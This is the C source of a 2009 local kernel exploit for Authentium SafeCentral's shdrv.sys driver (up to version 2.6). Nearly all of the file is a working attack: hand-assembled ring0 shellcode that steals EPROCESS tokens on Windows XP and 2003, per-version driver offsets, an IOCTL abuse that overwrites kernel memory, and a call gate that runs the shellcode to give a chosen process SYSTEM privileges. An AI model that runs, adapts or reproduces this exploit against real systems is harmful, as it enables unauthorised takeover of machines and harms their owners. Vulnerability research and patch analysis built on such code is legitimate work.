/* safecentral-unharden-v2.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * Authentium SafeCentral <= 2.6 shdrv.sys local kernel ring0 SYSTEM exploit
 * by mu-b - Thu 3 Sep 2009
 *
 * - Tested on: shdrv.sys 2.0.0.146
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define SAFECNTRL_IOCTL   0x00226003

static unsigned char win32_fixup[] =
  "\x53"
  "\xb8\x00\x00\x00\x00"
  "\xbb\x00\x00\x00\x00"
  "\x8b\x00"
  "\x89\x03"
  "\x31\xdb"
  "\x4b"
  "\x89\x18";

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b <mu-b@digit-lab.org>
 */
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =
  "\x5b"
  "\xc3";

struct ioctl_ver_req {
  DWORD *maj;
  CHAR pad[4];
  DWORD *med;
  CHAR _pad[4];
  DWORD *min;
  CHAR __pad[4];
  DWORD *rel;
  CHAR ___pad[4];
};

struct ioctl_req {
  DWORD action;
  struct ioctl_ver_req *args;
  DWORD *result;
};

struct ioctl_call {
  DWORD len;
  PVOID func;
  DWORD arg_len;
};

static struct targets {
  CONST CHAR *name;
  DWORD struct_off;
  DWORD struct2_off;
} targets_t[] = {
  { "2.0.0.128", 0x00019838, 0x0001959C },
  { "2.0.0.141", 0x0001C430, 0x0001C178 },
  { "2.0.0.146", 0x0001CBC4, 0x0001C8F8 },
  { NULL, 0, 0 },
};

static PCHAR
fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen, DWORD struct_off, DWORD struct2_off)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  *(PDWORD) &win32_fixup[2] = (DWORD) base + struct2_off;
  *(PDWORD) &win32_fixup[7] = (DWORD) base + struct_off;

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

static PVOID
get_module_base (void)
{
  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  DWORD i, num_modules, status, rlen;
  PVOID result;

  status = NtQuerySystemInformation (SystemModuleInformation, NULL, 0, &rlen);
  if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  pModuleInfo = (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, rlen);

  status = NtQuerySystemInformation (SystemModuleInformation, pModuleInfo, rlen, &rlen);
  if (status != STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  num_modules = pModuleInfo->Count;
  pModuleBase = &pModuleInfo->Module[0];
  result = NULL;

  for (i = 0; i < num_modules; i++, pModuleBase++)
    if (strstr (pModuleBase->ImageName, "shdrv.sys"))
      {
        result = pModuleBase->Base;
        break;
      }

  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);

  return (result);
}

static DWORD
get_module_version (HANDLE hFile, DWORD *maj, DWORD *med, DWORD *min, DWORD *rel)
{
  struct ioctl_ver_req ver_req;
  struct ioctl_req req;
  DWORD req_result, rlen;
  OVERLAPPED olStruct;
  BOOL bResult;

  memset (&req, 0, sizeof req);
  req.action = 10;
  req.args = &ver_req;
  req.result = &req_result;

  memset (&ver_req, 0xCC, sizeof ver_req);
  ver_req.maj = maj;
  ver_req.med = med;
  ver_req.min = min;
  ver_req.rel = rel;

  memset (&olStruct, 0, sizeof olStruct);
  olStruct.hEvent = CreateEventW (NULL, TRUE, FALSE, NULL);
  if (!olStruct.hEvent)
    {
      fprintf (stderr, "* CreateEventW failed\n");
      exit (EXIT_FAILURE);
    }

  bResult = DeviceIoControl (hFile, SAFECNTRL_IOCTL,
                             &req, sizeof req, NULL, 0, &rlen, &olStruct);
  if (!bResult)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }

  bResult = GetOverlappedResult (hFile, &olStruct, &rlen, 1);
  if (!bResult)
    {
      fprintf (stderr, "* GetOverlappedResult failed\n");
      exit (EXIT_FAILURE);
    }

  CloseHandle (olStruct.hEvent);

  return (req_result);
}

int
main (int argc, char **argv)
{
  struct ioctl_call *gate;
  struct ioctl_req req;
  DWORD cpage_len, dResult, i, ppid, req_result, rlen, struct_off, struct2_off, ver[4], zlen;
  LPVOID cpage, base, zpage, zbuf;
  CHAR verbuf[32];
  HANDLE hFile;
  BOOL bResult;

  printf ("Authentium SafeCentral <= 2.6 shdrv.sys local kernel ring0 SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA ("\\\\.\\ShDev", GENERIC_READ,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  printf ("* get driver version...\n");
  get_module_version (hFile, &ver[0], &ver[1], &ver[2], &ver[3]);

  snprintf (verbuf, sizeof verbuf - 1, "%d.%d.%d.%d", ver[0], ver[1], ver[2], ver[3]);
  printf ("** version: %s\n", verbuf);
  printf ("* done\n");

  for (i = 0; targets_t[i].name; i++)
    if (strcmp (targets_t[i].name, verbuf) == 0)
      {
        struct_off = targets_t[i].struct_off;
        struct2_off = targets_t[i].struct2_off;
        break;
      }

  if (targets_t[i].name == NULL)
    {
      fprintf (stderr, "* unsupported version found :( [%s]\n", verbuf);
      exit (EXIT_FAILURE);
    }

  cpage_len = 0x1000;
  cpage = (LPVOID) 0x00000001;
  dResult = NtAllocateVirtualMemory ((HANDLE) -1, &cpage, 0, &cpage_len,
                                     MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
  if (dResult != STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtAllocateVirtualMemory failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated call page: 0x%08X [%d-bytes]\n",
          cpage, cpage_len);

  zpage = VirtualAlloc (NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, "* VirtualAlloc failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x1000);

  gate = cpage + ver[0];
  gate->len = 1;
  gate->func = zpage;
  gate->arg_len = 0;
  printf ("* call gate: %d function, func[0]: 0x%08X, arg_len: %d, base: @0x%08X\n",
          gate->len, gate->func, gate->arg_len, gate);

  base = get_module_base ();
  if (base == NULL)
    {
      fprintf (stderr, "* unable to find shdrv.sys base\n");
      exit (EXIT_FAILURE);
    }
  printf ("* shdrv.sys base: 0x%08X\n", base);

  memset (zpage, 0xCC, 0x1000);
  zbuf = fixup_ring0_shell (base, ppid, &zlen, struct_off, struct2_off);
  memcpy ((LPVOID) zpage, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy ((LPVOID) (zpage + sizeof (win32_fixup) - 1), zbuf, zlen);
  memcpy ((LPVOID) (zpage + sizeof (win32_fixup) + zlen - 1),
          win32_ret, sizeof (win32_ret) - 1);

  printf ("* overwriting @0x%08X.. ", (DWORD *) (base + struct_off));
  fflush (stdout);

  get_module_version (hFile, (DWORD *) (base + struct_off),
                      &ver[0], &ver[0], &ver[0]);
  printf ("done\n");

  memset (&req, 0, sizeof req);
  req.action = 0;
  req.args = NULL;
  req.result = &req_result;

  printf ("* jumping.. "); Sleep (1000);
  fflush (stdout);

  bResult = DeviceIoControl (hFile, SAFECNTRL_IOCTL,
                             &req, sizeof req, NULL, 0, &rlen, NULL);
  if (!bResult)
    {
      fprintf (stderr, "\n* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("* hmmm, you didn't STOP the box?!?!\n");
  
  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}
